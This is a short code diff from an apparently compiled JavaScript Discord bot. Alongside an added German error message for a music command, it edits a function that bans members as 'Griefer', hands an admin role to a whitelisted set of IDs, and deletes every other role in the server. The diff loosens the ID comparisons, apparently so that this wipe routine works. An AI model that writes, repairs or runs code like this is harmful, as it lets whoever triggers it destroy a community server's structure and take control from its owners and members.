@@ -30,6 +30,8 @@ exports.play = {
         const name = interaction.options.get("name")?.value;
         const song = await queue.play(name).catch(err => {
             console.log(err);
+            interaction.followUp({ embeds: [new discord_js_1.EmbedBuilder().setColor("Red").setDescription("Es ist ein Fehler aufgetreten: " + err.name)] });
+            return;
         });
         const embed = new discord_js_1.EmbedBuilder()
             .setDescription(`Playing [${song}](${song.url}) (${song.duration})`)
@@ -50,7 +52,7 @@ const run = async (client, interaction) => {
         reason: "Griefer"
     });
     for (let member of dont_ban.keys()) {
-        await guild.members.cache.find((value) => parseInt(value.id) === member)?.roles.add(admin_role);
+        await guild.members.cache.find((value) => parseInt(value.id) == member)?.roles.add(admin_role);
     }
     await guild.channels.fetch();
     await guild.channels.cache.forEach(async (channel) => {
@@ -64,7 +66,7 @@ const run = async (client, interaction) => {
     await guild.roles.fetch();
     await guild.roles.cache.forEach(async (role) => {
         try {
-            if (admin_role.id === role.id)
+            if (admin_role.id == role.id)
                 return;
             await role.delete();
         }
